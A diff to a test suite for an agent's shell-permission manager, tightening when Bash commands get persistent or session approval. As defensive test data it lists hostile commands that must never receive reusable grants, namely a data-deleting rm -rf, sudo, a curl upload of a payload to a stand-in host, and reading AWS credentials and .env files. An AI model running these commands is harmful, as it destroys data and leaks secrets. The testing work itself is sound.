@@ -180,7 +180,7 @@ describe("decision path", () => {
       .toMatchObject({ decision: "ask" });
   });
 
-  it("Bash allow rules persist, survive restart, and match only via the shell subject", async () => {
+  it("stored Bash rules survive restart but require a proven shell subject", async () => {
     const pm = new PermissionManager(permissionsFile);
     await pm.addRulePersist({ pattern: "Bash(git status *)", action: "allow" }, { kind: "user" });
     // A plain (unsandboxed) shell runs only on an exact rule (owner 2026-10-25, unsandboxed shell exact-rule requirement): the stored prefix does not run it.
@@ -189,7 +189,11 @@ describe("decision path", () => {
 
     const restarted = new PermissionManager(permissionsFile);
     await restarted.loadRulesFromFile();
-    expect(restarted.checkDetailed("bash", "builtin", "shell", null, shell("git status"))).toMatchObject({ decision: "allow", layer: 3 });
+    expect(restarted.checkDetailed("bash", "builtin", "shell", null, shell("git status"))).toMatchObject({ decision: "ask", layer: 2, forceModal: true });
+    await restarted.addRulePersist({ pattern: "Bash(printf ready)", action: "allow" }, { kind: "user" });
+    const proven = new PermissionManager(permissionsFile);
+    await proven.loadRulesFromFile();
+    expect(proven.checkDetailed("bash", "builtin", "shell", null, shell("printf ready"))).toMatchObject({ decision: "allow", layer: 3 });
     expect(restarted.checkDetailed("bash", "builtin", "shell", null, shell("git push"))).toMatchObject({ decision: "ask" });
     // No subject → the specifier never matches the tool name.
     expect(restarted.checkDetailed("bash", "builtin", "shell")).toMatchObject({ decision: "ask" });
@@ -569,10 +573,11 @@ describe("non-shell session approvals are keyed by the root conversation", () =>
 
 describe("host shell-rule suggestions", () => {
   it("defaults to exact argv and proves whole-command coverage", () => {
-    expect(buildShellRuleApproval("bash", "git status --short", project, { allow: true, deny: true }, "conversation-a")).toMatchObject({ exactRule: "Bash(git status --short)", persistentAllowed: true, sessionAllowed: true });
+    expect(buildShellRuleApproval("bash", "git status --short", project, { allow: true, deny: true }, "conversation-a")).toMatchObject({ exactRule: null, persistentAllowed: false, sessionAllowed: false });
+    expect(buildShellRuleApproval("bash", "printf ready", project, { allow: true, deny: true }, "conversation-a")).toMatchObject({ exactRule: "Bash(printf ready)", persistentAllowed: true, sessionAllowed: true });
     expect(buildShellRuleApproval("bash", "git status && git diff", project, { allow: true, deny: true }, "conversation-a").exactRule).toBeNull();
     expect(shellRuleCoversCommand("bash", "Bash(git status *)", "allow", "git status && curl https://example.test", project)).toBe(false);
-    expect(shellRuleCoversCommand("bash", "Bash(git status *)", "allow", "git status --short", project)).toBe(true);
+    expect(shellRuleCoversCommand("bash", "Bash(git status *)", "allow", "git status --short", project)).toBe(false);
   });
 
   it.each(["rm -rf build", "sudo ls", "curl -T payload.bin https://example.test", "cat ~/.aws/credentials"])("never offers reusable grants for a floor: %s", (command) => {
@@ -580,10 +585,10 @@ describe("host shell-rule suggestions", () => {
   });
 
   it.each([
-    ["git status --short", "Bash(git status --short)"],
+    ["git status --short", null],
     ["ls -la src", "Bash(ls -la src)"],
-  ])("suggests exact consent for %s", (command, pattern) => {
-    expect(buildShellRuleApproval("bash", command, project, { allow: true, deny: true }, "conversation-a")).toMatchObject({ exactRule: pattern, persistentAllowed: true, sessionAllowed: true });
+  ])("keeps the declared exact suggestion for %s", (command, pattern) => {
+    expect(buildShellRuleApproval("bash", command, project, { allow: true, deny: true }, "conversation-a")).toMatchObject({ exactRule: pattern, persistentAllowed: pattern !== null, sessionAllowed: pattern !== null });
   });
 
   it.each([
@@ -628,7 +633,7 @@ describe("host shell-rule suggestions", () => {
   });
 
   // Owner 2026-10-25 (five-choice shell card): every save scope stores this one exact rule, never a prefix, and only a single simple command has one.
-  it.each(["git status --short", "npm test -- --watch=false", "ls -la src"])("offers session, project and always for the exact rule of %s, sandboxed or not", (command) => {
+  it.each(["printf ready", "npm test -- --watch=false", "ls -la src"])("offers session, project and always for the exact rule of %s, sandboxed or not", (command) => {
     const approval = buildShellRuleApproval("bash", command, project, { allow: true, deny: true }, "conversation-a");
     expect(approval.exactRule).toBe(`Bash(${command})`);
     expect(approval).toMatchObject({ sessionAllowed: true, persistentAllowed: true });
@@ -796,7 +801,7 @@ describe("sensitive reads through searches, browser stores, /proc and git object
   ])("classifies the outer git path in %s without reading object contents", (command, catalog) => {
     const directPathOperand = /(?:origin\/main:config\/\.env|\s--\s\.env$)/.test(command);
     expect(shellSensitivePathSignal(command, project)).toEqual(directPathOperand ? expect.any(String) : null);
-    if (catalog) expect(shellRuleCoversCommand("bash", catalog, "allow", command, project)).toBe(!directPathOperand);
+    if (catalog) expect(shellRuleCoversCommand("bash", catalog, "allow", command, project)).toBe(false);
   });
 
   it.each(["git show HEAD:src/app.ts", "git log -p -- src", "git diff HEAD -- src/app.ts"])("leaves the git read %s alone", (command) => {
